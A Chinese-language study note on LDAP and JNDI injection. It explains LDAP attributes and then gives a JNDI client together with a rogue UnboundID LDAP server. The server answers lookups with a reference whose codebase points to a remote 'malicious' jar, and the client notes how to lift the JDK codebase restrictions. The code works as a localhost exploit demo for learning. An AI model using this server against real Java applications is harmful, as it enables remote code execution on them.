# LDAP

## 0x00 Introduction

LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol）



## 0x01 LDAP

>目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。

### 常用属性
| 属性名称 | 全称                          | 说明                                                                 |
|------|-----------------------------|--------------------------------------------------------------------|
| dn   | distinguished name          | 唯一标识名，类似于绝对路径，每个对象都有唯一标识名。例：uid=tester,ou=People,dc=example,dc=com |
| rdn  | relative distinguished name | 相对标识名，类似于相对路径。例：uid=tester                                         |
| uid  | user id                     | 通常指用户登录名。例：uid=tester                                              |
| sn   | sur name                    | 通常指一个人的姓氏。例：sn: Wang                                               |
| dc   | domain component            | 通常指定一个域名。例：DC=lenovo,DC=com                                        |
| ou   | organization unit           | 通常指定一个组织单元的名称。例：OU=工业8.0部,DC=hspv,DC=com                           |
| cn   | common name                 | 通常指一个对象的名称。如果是人，需要使用全名。例：CN=ldapadmin                              |
| c    | country                     | 一个二位的国家代码。例：CN、US、HK、JP等。                                          |

### JNDI中的LDAP协议

LDAP协议课存储JAVA的对象：
1. Java serializable objects
2. Referenceable objects and JNDI References
3. Objects with attributes (DirContext)
4. RMI (Java Remote Method Invocation) objects (including those that use IIOP)
5. CORBA objects

## 0x02 代码示例

### 危险函数
`javax.naming.InitialContext.lookup()`

### 客户端

```java
package jndi;

import javax.naming.InitialContext;

public class client {
    public static void main(String[] args) {
        //高版本jdk需要打开远程加载类的限制
        /*
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");*/
        try{
            String url = "ldap://localhost:3890/test";
            InitialContext initialContext = new InitialContext();
            Object obj =initialContext.lookup(url);
            System.out.println(obj);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}

### 服务端

```java
package jndi;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class ldapserver {

    // 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
    public static final String BIND_HOST = "127.0.0.1";
    // 设置LDAP服务端口
    public static final int SERVER_PORT = 3890;

    public static void main(String[] args) {
        try {
            // 创建LDAP配置对象
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=test,dc=org");
            // 设置LDAP监听配置信息
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", InetAddress.getByName(BIND_HOST), SERVER_PORT,
                    ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault())
            );
            // 添加自定义的LDAP操作拦截器
            config.addInMemoryOperationInterceptor(new OperationInterceptor());

            // 创建LDAP服务对象
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            // 启动服务
            ds.startListening();
            System.out.println("LDAP服务启动成功");
        }catch (Exception e){
            e.printStackTrace();
        }

    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base  = result.getRequest().getBaseDN();
            Entry  entry = new Entry(base);

            try {
                // 设置对象的工厂类名
                String className = "test"; //修改
                entry.addAttribute("javaClassName", className);
                entry.addAttribute("javaFactory", className);

                // 设置远程的恶意引用对象的jar地址
                entry.addAttribute("javaCodeBase", "<http://127.0.0.1:8080/>");

                // 设置LDAP objectClass
                entry.addAttribute("objectClass", "javaNamingReference");

                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

    }
}
```


```







## Ref 
- [JNDI-LDAP%20注入及高版本JDK限制](https://m0d9.me/2020/07/23/JNDI-LDAP%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%E2%80%94%E2%80%94%E4%B8%8A/)
- [Java-JNDI分析与利用](https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/)